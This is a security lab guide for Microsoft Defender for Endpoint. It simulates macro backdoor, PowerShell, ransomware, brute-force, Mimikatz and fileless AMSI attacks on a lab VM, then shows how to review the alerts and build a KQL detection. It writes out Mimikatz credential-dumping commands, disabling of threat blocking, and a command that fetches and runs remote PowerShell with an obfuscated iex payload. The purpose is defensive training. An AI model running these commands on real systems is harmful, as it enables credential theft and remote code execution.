# Attack Simulation

- Topics
  - Scenario 3: Automated incident response - triggers automated investigation, which automatically hunts for and remediates breach artifacts to scale your incident response capacity.
  - Detection and response
  - Investigate and response to threats
  - Automated Investigation and Response (AIR)

## Exercise 1: Simulation Attacks (Backdoor)

This attack will use a word document with macros to install a backdoor and persistence components.

### Task 1: Simulate Attack

1. Open the `./artifacts/day-02/AttackSimulationDIYv4_FileAttack.pdf` file, this contains the actual simulation details.
2. Switch to the **wssecuritySUFFIX-win10** virtual machine
3. Download the `./artifacts/day-02/WinATP-Intro-Invoice.docm` document to the machine
4. Open it, when prompted, enter the password **WDATP!diy#**
5. Select **Enable Editing**
6. Select **Enable Content**
7. Select **OK** in the dialog
8. Browse to the desktop, you should see a **WinATP-Intro-Backdoor.exe** file show up
9. Open the **Scheduled Tasks** mmc, notice a new task has also been created
10. A registry key will also be added to the `Run` key
11. A command prompt will be displayed showing the tool is running.

### Task 2: Review Alerts

1. Switch to the [Endpoint Portal](https://security.microsoft.com)
2. Expand **Incidents & alerts**, select **Incidents**

    > **NOTE** Allow 15-20 minutes for the data to display in the portal

3. Notice the **Multi-stage incident Execution & Persistence on one endpoint** incident, select it
4. Review each of the tabs of the incident
   1. Alerts
   2. Devices
   3. Users
   4. Mailboxes
   5. Investigations
   6. Evidence and Response
5. Select **Manage incident**
6. Toggle the **Assign to me** and **Resolve incident** to true
7. For the classification, select **True alert**
8. For determination, select **Security testing**
9. Select **Save**

### Task 3: Live Response

1. Switch to the [Endpoint Portal](https://security.microsoft.com)
2. Select **Settings**, then select **Endpoints**
3. Under **General**, select **Advanced Features**
4. Ensure that the **Live Response** and **Live Response for Servers** are both toggled to **On**
5. Select **Save Preferences** if needed
6. Select **Device Inventory**
7. Select the **wssecuritySUFFIX-win10** virtual machine
8. Select the ellispes, then select **Initiate Live Response Session**

    > **NOTE** You may need to stop any automated investigation processes running. Additionally, the machine [must be a certain OS level](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/live-response?view=o365-worldwide#before-you-begin) for Live Response to work.

9. A browser based session will start.  Run the following commands to see what you can do with the tool:

    ```cmd
    help
    ```

10. Run the following commands to start an analyze process:

    ```cmd
    analyze file "C:\Users\wsuser\OneDrive - Solliance\Desktop\RS4_WinATP-Intro-Invoice.docm"
    ```

11. The file will be scanned and the results displayed:

IMAGE TODO

### Task 4: Advanced Hunting

1. Switch to the [Endpoint Portal](https://security.microsoft.com)
2. Expand **Hunting**, select **Advanced Hunting**
3. Select the **Query** tab
4. Paste the following:

    ```kql
    DeviceProcessEvents
    | where InitiatingProcessFileName in~ ("winword.exe","excel.exe","powerpnt.exe") 
    | where FileName =~ "powershell.exe"
    | where Timestamp > ago(30d)
    ```

5. Select **Run query**, you should see one result displayed
6. Select **Save->Save**
7. For the name, type **PowerShell Hunting**
8. Select **Save**
9. Select **Create detection rule**
10. For the Detection name and alert title, type **Custom Detection| Downloaded Office file executes PowerShell**
11. For the Frequency, select **Every 24 hours**
12. For the Severity, select **Medium**
13. For the Category, select **Suspicious activity**
14. For the Description, type **A downloaded Microsoft Office file executed PowerShell commands.This alert is based on a scheduledAdvanced hunting query**
15. For the Recommended actions, **Check the Microsoft Office file and determine if the PowerShell activity is expected**
16. Select **Next**
17. For the **Impacted entities**, check the **Device** and **User** checkboxes
18. For the Device, select **DeviceID**
19. For the User, select **AccountSid**
20. Select **Next**
21. Expand **Devices**, select the following:
    1.  Collect investigation package
    2.  Run antivirus scan
22. Select **Next**
23. Select **Create**

## Exercise 2: Simulation Attacks (PowerShell/Memory)

This attack will use PowerShell to perform a memory-based attack.

### Task 1: Simulate Attack

1. Open the `./artifacts/day-02/AttackSimulationDIYv4_MemoryAttack.pdf` file, this contains the actual simulation details.
2. Switch to the **wssecuritySUFFIX-win10** virtual machine
3. Download the `./artifacts/day-02/PowerShell-Attack.ps1` document to the machine to `c:\temp`
4. Open a Windows PowerShell window, run the following:

    ```powershell
    & c:\temp\powershell-attack.ps1
    ```

5. A notepad window will open with some information
6. Open the **Windows & Virus** settings page, you should see a warning message displayed for the `EUS:Win32/CustomEnterpriseBlock` attack pattern

### Task 2: Review Alerts

1. Switch to the [Endpoint Portal](https://security.microsoft.com)
2. Expand **Incidents & alerts**, select **Incidents**

    > **NOTE** Allow 15-20 minutes for the data to display in the portal

3. Notice the **Unexpected behavior observed by a process ran wih no command line arguments...** incident, select it
4. Again, review each of the tabs of the incident
5. Select **Manage incident**
6. Toggle the **Assign to me** and **Resolve incident** to true
7. For the classification, select **True alert**
8. For determination, select **Security testing**
9. Select **Save**

## Exercise 4: Simulation Attacks (Bruteforce)

This exercise will show how a SSH bruteforce attack can be performed against a Linux IoT device.

### Task 1: Simulate Attack

1. Switch to the **wssecuritySUFFIx-paw-1** machine
2. Open a Windows PowerShell ISE window, then open the `` file
3. Press **F5** to run the script

### Task 2: Review Alerts

1. Switch to the [Endpoint Portal](https://security.microsoft.com)
2. Expand **Incidents & alerts**, select **Incidents**
3. Review any alerts

## Exercise 3: Simulation Attacks (Ransomware Attack) - OPTIONAL

This exercise will show how a ransomware attack will encrypt the files on a device.

### Task 1: Simulate Attack

1. Run the `encryptfiles.ps1` PowerShell Script
2. Open the OneDrive folder, you should see several files that have recently been modified
3. Attempt to open the `1.txt` file, notice it has been encrypted and does not show a series of numbers.  You should see the same has happened for all files in the directory

    > **Note**: Defender for Endpoint will not register this as an attack, but your files have now been encrypted!

## Exercise 4: Simulation Attacks (mimikatz) - OPTIONAL

This exercise will show how to perform a credentials based attack using the Mimikatz tool.

### Task 1: Download Mimikatz Tool

1. Open the [release page](https://github.com/gentilkiwi/mimikatz/releases) for the mimikatz tool
2. Select to download the **mimikatz_trunk.zip** file, you should get an error
3. Open the **Windows Security** settings page
4. Browse to the latest **Threat blocked** item, expand it to see it contains several threats `HackTool:Win64/Mikatz!dha`, `HackTool:Win32/Mimikatz.D`, `HackTool:Win32/Mimilove.A!dha`
5. For each of the threats, select **Allow on device**

    > **NOTE** This tool should not be downloaded into customer environments or into your own environment. Only perform this action in the lab environment.

6. Again, select to download the **mimikatz_trunk.zip** file, you should not get an error.
7. Extract the zip file to `c:\temp`
8. Open a new command prompt, run the following:

    ```cmd
    C:\temp\x64\mimikatz.exe
    ```

9. You should see a prompt displaying the mimikatz version.  

### Task 2: Simulate Attack

1. In the mimikatz window, run the following commands to elevate the current process to have debug privledges:

    ```cmd
    privilege::debug
    ```

2. Run the following code to see what passwords are in `LSASS`:

    ```cmd
    sekurlsa::logonpasswords
    ```

3. Run the following code to dump the `LSASS` process memory to a file:

    ```cmd
    sekurlsa::minidump C:\temp\minidump_656.dmp
    ```

4. To dump the hashes in a format that can move from machine to machine (pass-the-hash), run the following:

    ```cmd
    lsadump::sam /SYSTEM:system.hive /SAM:sam.hive
    ```

5. If the mimiktaz tool (or similar) were to make it onto a machine with several credentials loaded, it would make it very easy for an attacker to move from the initially breached system to other systems

## Exercise 5: Anitmalware Scan Interface (AMSI)

This exercise will show how to perform a fileless threat simulation.

### Task 1: Execute the Attack

1. Open a PowerShell window, run the following:

    ```PowerShell
    Invoke-Expression (Invoke-WebRequest https://pastebin.com/raw/JHhnFV8m)
    ```

2. The downloaded file looks like the following:

    ```PowerShell
    $base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="
    $bytes = [Convert]::FromBase64String($base64)
    $string = -join ($bytes | % { [char] ($_ -bxor 0x33) })
    iex $string
    ```

3. Run the following

    ```PowerShell
    Get-WinEvent "Microsoft-Windows-Windows Defender/Operational" | Where-Object Id -eq 1116 | Format-List
    ```
